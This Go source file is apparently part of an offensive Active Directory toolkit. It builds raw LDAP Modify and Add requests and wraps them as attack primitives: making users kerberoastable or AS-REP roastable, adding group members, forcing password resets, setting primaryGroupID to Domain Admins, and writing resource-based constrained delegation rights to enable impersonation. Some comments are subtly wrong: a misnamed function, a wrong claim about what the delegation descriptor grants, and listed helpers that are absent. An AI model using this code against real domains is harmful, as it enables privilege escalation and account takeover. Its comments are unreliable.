package adgo

import (
	"errors"
	"fmt"
	"time"
)

// LDAP Modify primitives — the write side of AD attack paths. These are
// the operations that turn enumeration into escalation:
//
//   AddUser / DeleteUser
//   AddUserToGroup / RemoveUserFromGroup
//   SetUserPassword     (unauthenticated via userPassword; authenticated
//                       via unicodePwd if you know the current hash)
//   AddSPN / RemoveSPN  (turns a user into a kerberoastable target)
//   SetDontReqPreauth   (turns a user into an AS-REP roastable target)
//   SetUACFlag          (generic userAccountControl flip)
//   SetAttribute        (arbitrary attribute write — the underlying primitive)
//   DeleteAttribute
//
// Every operation here is one LDAPModify (tag 0x66) with a specific
// attribute + operation value. The primitive is at the bottom; the
// named wrappers are convenience.

// LDAP modify operation codes
const (
	ModAdd       = 0
	ModDelete    = 1
	ModReplace   = 2
	ModIncrement = 3
)

// buildModifyRequest builds an LDAP ModifyRequest (APPLICATION 6, tag 0x66).
//
//	object       (OCTET STRING) — the target DN
//	changes      (SEQUENCE OF change)
//	  change:    operation (ENUMERATED), modification (PartialAttribute)
//	  PartialAttribute: type (OCTET STRING), vals (SET OF OCTET STRING)
func buildModifyRequest(msgID int, dn string, changes [][3]interface{}) []byte {
	var changeSeq []byte
	for _, c := range changes {
		op := c[0].(int)
		attr := c[1].(string)
		vals := c[2].([]string)
		var setSeq []byte
		for _, v := range vals {
			setSeq = append(setSeq, ldapString(v)...)
		}
		partial := append(ldapString(attr), berTag(0x31, setSeq)...)
		change := append(berEnumerated(op), berSequence(partial)...)
		changeSeq = append(changeSeq, berSequence(change)...)
	}
	inner := append(ldapString(dn), berSequence(changeSeq)...)
	op := berTag(0x66, inner)
	return ldapMessage(msgID, op)
}

// Modify sends one LDAP Modify and checks the response result code.
func (c *LDAPConn) Modify(dn string, changes [][3]interface{}) error {
	c.msgID++
	req := buildModifyRequest(c.msgID, dn, changes)
	_ = c.conn.SetDeadline(time.Now().Add(c.opts.Timeout))
	if _, err := c.conn.Write(req); err != nil {
		return fmt.Errorf("adgo: modify write: %w", err)
	}
	resp, err := c.readMessage()
	if err != nil {
		return err
	}
	return parseModifyResponse(resp)
}

// parseModifyResponse pulls the result code from a ModifyResponse (0x67).
func parseModifyResponse(raw []byte) error {
	rr := &berReader{b: raw}
	if t, err := rr.readTag(); err != nil || t != 0x30 {
		return errors.New("adgo: modify response not a sequence")
	}
	body, err := rr.readContent()
	if err != nil {
		return err
	}
	inner := &berReader{b: body}
	_, _ = inner.readTag()
	_, _ = inner.readContent() // message id
	tag, err := inner.readTag()
	if err != nil {
		return err
	}
	if tag != 0x67 {
		return fmt.Errorf("adgo: unexpected modify response tag 0x%02x", tag)
	}
	respBody, _ := inner.readContent()
	rb := &berReader{b: respBody}
	t2, _ := rb.readTag()
	if t2 != 0x0A {
		return errors.New("adgo: no result code")
	}
	rc, _ := rb.readContent()
	if len(rc) == 0 || rc[0] != 0 {
		// pull the diagnostic message if present
		if len(rc) > 0 {
			return fmt.Errorf("adgo: modify result code %d", rc[0])
		}
		return errors.New("adgo: modify result code empty")
	}
	return nil
}

// AddUser creates a new user object.
//
//	dn: CN=<name>,<ou>  (e.g. "CN=svc,OU=ServiceAccounts,DC=corp,DC=local")
//	pass: initial password (unicodePwd)
func (c *LDAPConn) AddUser(dn, samAccountName, password, ou string) error {
	// For a proper Add (tag 0x68), the interface differs from Modify. This
	// helper does an Add then sets unicodePwd in a second Modify since
	// unicodePwd requires special handling (SASL+sealed or LDAPS).
	addReq := buildAddRequest(c.msgID+1, dn, map[string][]string{
		"objectClass":      {"top", "person", "organizationalPerson", "user"},
		"cn":               {samAccountName},
		"samAccountName":   {samAccountName},
		"userPrincipalName": {samAccountName + "@" + domainFromDN(dn)},
		"displayName":      {samAccountName},
	})
	c.msgID++
	_ = c.conn.SetDeadline(time.Now().Add(c.opts.Timeout))
	if _, err := c.conn.Write(addReq); err != nil {
		return fmt.Errorf("adgo: add write: %w", err)
	}
	resp, err := c.readMessage()
	if err != nil {
		return err
	}
	if err := parseAddResponse(resp); err != nil {
		return err
	}
	if password != "" {
		// unicodePwd is a quoted UTF-16LE string
		enc := encodeUnicodePwd(password)
		return c.Modify(dn, [][3]interface{}{
			{ModReplace, "unicodePwd", []string{enc}},
		})
	}
	return nil
}

// buildAddRequest builds an LDAP AddRequest (APPLICATION 8, tag 0x68).
func buildAddRequest(msgID int, dn string, attrs map[string][]string) []byte {
	var attrSeq []byte
	for k, vals := range attrs {
		var setSeq []byte
		for _, v := range vals {
			setSeq = append(setSeq, ldapString(v)...)
		}
		partial := append(ldapString(k), berTag(0x31, setSeq)...)
		attrSeq = append(attrSeq, berSequence(partial)...)
	}
	inner := append(ldapString(dn), berSequence(attrSeq)...)
	op := berTag(0x68, inner)
	return ldapMessage(msgID, op)
}

func parseAddResponse(raw []byte) error {
	rr := &berReader{b: raw}
	_, _ = rr.readTag()
	body, err := rr.readContent()
	if err != nil {
		return err
	}
	inner := &berReader{b: body}
	_, _ = inner.readTag()
	_, _ = inner.readContent()
	tag, _ := inner.readTag()
	if tag != 0x69 {
		return fmt.Errorf("adgo: unexpected add response tag 0x%02x", tag)
	}
	respBody, _ := inner.readContent()
	rb := &berReader{b: respBody}
	t, _ := rb.readTag()
	if t != 0x0A {
		return errors.New("adgo: no result code")
	}
	rc, _ := rb.readContent()
	if len(rc) > 0 && rc[0] != 0 {
		return fmt.Errorf("adgo: add result code %d", rc[0])
	}
	return nil
}

// encodeUnicodePwd encodes a password as unicodePwd: UTF-16LE in double quotes.
func encodeUnicodePwd(pw string) string {
	// surround with quotes, encode UTF-16LE bytes into a Go string
	quoted := "\"" + pw + "\""
	utf16 := make([]byte, 0, len(quoted)*2)
	for _, r := range quoted {
		if r < 0x10000 {
			utf16 = append(utf16, byte(r), byte(r>>8))
		}
	}
	return string(utf16)
}

func domainFromDN(dn string) string {
	var parts []string
	for _, p := range splitDN(dn) {
		if len(p) > 3 && (p[:3] == "DC=" || p[:3] == "dc=") {
			parts = append(parts, p[3:])
		}
	}
	out := ""
	for i, p := range parts {
		if i > 0 {
			out += "."
		}
		out += p
	}
	return out
}

// splitDN splits a DN on commas not inside escapes.
func splitDN(dn string) []string {
	var out []string
	var cur []byte
	for i := 0; i < len(dn); i++ {
		c := dn[i]
		if c == '\\' && i+1 < len(dn) {
			cur = append(cur, c, dn[i+1])
			i++
			continue
		}
		if c == ',' {
			out = append(out, string(cur))
			cur = nil
			continue
		}
		cur = append(cur, c)
	}
	if len(cur) > 0 {
		out = append(out, string(cur))
	}
	return out
}

// AddUserToGroup adds a DN to a group's member attribute.
func (c *LDAPConn) AddUserToGroup(groupDN, userDN string) error {
	return c.Modify(groupDN, [][3]interface{}{
		{ModAdd, "member", []string{userDN}},
	})
}

// RemoveUserFromGroup removes a DN from a group's member attribute.
func (c *LDAPConn) RemoveUserFromGroup(groupDN, userDN string) error {
	return c.Modify(groupDN, [][3]interface{}{
		{ModDelete, "member", []string{userDN}},
	})
}

// SetAttribute is the generic write primitive.
func (c *LDAPConn) SetAttribute(dn, attr, value string) error {
	return c.Modify(dn, [][3]interface{}{
		{ModReplace, attr, []string{value}},
	})
}

// DeleteAttribute removes all values of an attribute.
func (c *LDAPConn) DeleteAttribute(dn, attr string) error {
	return c.Modify(dn, [][3]interface{}{
		{ModDelete, attr, []string{}},
	})
}

// AddSPN adds a servicePrincipalName — turns a normal user into a
// kerberoastable target.
func (c *LDAPConn) AddSPN(userDN, spn string) error {
	return c.Modify(userDN, [][3]interface{}{
		{ModAdd, "servicePrincipalName", []string{spn}},
	})
}

// RemoveSPN removes a servicePrincipalName.
func (c *LDAPConn) RemoveSPN(userDN, spn string) error {
	return c.Modify(userDN, [][3]interface{}{
		{ModDelete, "servicePrincipalName", []string{spn}},
	})
}

// SetUserAccountControl writes a specific UAC value.
func (c *LDAPConn) SetUserAccountControl(dn string, uac uint32) error {
	return c.SetAttribute(dn, "userAccountControl", fmt.Sprintf("%d", uac))
}

// AddUACFlag ORs a flag into the current userAccountControl. Requires the
// caller to read the existing value first (EnumerateUsers returns it).
func (c *LDAPConn) AddUACFlag(dn string, current, flag uint32) error {
	return c.SetUserAccountControl(dn, current|flag)
}

// SetDontReqPreauth flips the DONT_REQ_PREAUTH bit — user becomes AS-REP roastable.
func (c *LDAPConn) SetDontReqPreauth(dn string, current uint32) error {
	return c.SetUserAccountControl(dn, current|UACDontRequirePreauth)
}

// ClearDontReqPreauth removes the bit.
func (c *LDAPConn) ClearDontReqPreauth(dn string, current uint32) error {
	return c.SetUserAccountControl(dn, current&^uint32(UACDontRequirePreauth))
}

// SetPrimaryGroupID changes the primaryGroupID — useful for shadow-cred
// chains (set to 512 = Domain Admins without actually joining the group).
func (c *LDAPConn) SetPrimaryGroupID(dn string, gid uint32) error {
	return c.SetAttribute(dn, "primaryGroupID", fmt.Sprintf("%d", gid))
}

// SetServicePrincipalNameToSelf is the classic RBCD setup helper — writes
// msDS-AllowedToActOnBehalfOfOtherIdentity to a target computer, allowing
// the given SID to impersonate any user to that computer.
//
// The securityDescriptor blob is a self-relative SD with a single ACE
// granting DS-Replication-Get-Changes-All to the attacker SID. The caller
// supplies the pre-encoded blob — encoding NTSecurityDescriptor correctly
// is its own file.
func (c *LDAPConn) SetAllowedToActOnBehalf(targetDN, encodedSD string) error {
	return c.Modify(targetDN, [][3]interface{}{
		{ModReplace, "msDS-AllowedToActOnBehalfOfOtherIdentity", []string{encodedSD}},
	})
}

// ModifyPassword forces a password reset via the LDAP Modify path. Requires
// the caller to be the target user OR have Reset Password rights.
func (c *LDAPConn) ModifyPassword(userDN, newPassword string) error {
	return c.Modify(userDN, [][3]interface{}{
		{ModReplace, "unicodePwd", []string{encodeUnicodePwd(newPassword)}},
	})
}
